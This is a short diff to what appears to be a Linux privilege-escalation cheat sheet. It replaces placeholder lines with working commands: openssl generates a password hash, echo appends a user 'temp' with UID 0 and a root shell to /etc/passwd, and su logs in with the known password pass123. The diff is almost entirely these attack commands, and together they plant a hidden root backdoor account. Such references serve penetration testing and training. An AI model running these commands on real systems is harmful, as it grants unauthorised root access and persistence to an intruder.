@@ -1325,10 +1325,12 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 
 # Creating entry for /etc/passwd
 openssl passwd -1 -salt ignite pass123
+> $1$ignite$3eTbJm98O9Hz.k1NTdNxe1
 
-temp:{RESULT}:0:0:root:/root:/bin/bash
+echo "temp:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> /etc/passwd
 
-temp:pass123
+su temp
+pass pass123
 ```
 <br />
 
